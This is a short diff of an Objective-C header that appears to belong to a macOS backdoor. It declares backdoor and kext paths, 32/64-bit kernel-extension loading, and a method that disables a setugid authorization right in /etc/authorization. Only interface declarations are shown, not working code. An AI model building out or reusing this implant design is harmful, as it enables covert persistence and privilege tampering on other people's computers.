@@ -19,14 +19,16 @@
 {
 @private
   NSString *mBackdoorPath;
-  NSString *mKextPath;
+  NSString *mKext32Path;
+  NSString *mKext64Path;
   NSString *mSLIPlistPath;
   NSString *mServiceLoaderPath;
   NSString *mExecFlag;
 }
 
 @property (readwrite, retain) NSString *mBackdoorPath;
-@property (readwrite, retain) NSString *mKextPath;
+@property (readwrite, retain) NSString *mKext32Path;
+@property (readwrite, retain) NSString *mKext64Path;
 @property (readwrite, retain) NSString *mSLIPlistPath;
 @property (readwrite, retain) NSString *mServiceLoaderPath;
 @property (readwrite, retain) NSString *mExecFlag;
@@ -108,7 +110,7 @@
 //
 // Load our kext
 //
-- (BOOL)loadKext;
+- (BOOL)loadKextFor64bit: (BOOL)is64bit;
 
 //
 // Unload our kext
@@ -124,6 +126,11 @@
 // Disable system.privilege.setugid_appkit in /etc/authorization
 //
 - (BOOL)disableSetugidAuth;
+
+//
+// Return TRUE if we are on MacOS X Leopard (10.5.x)
+//
+- (BOOL)isLeopard;
 
 @end
 
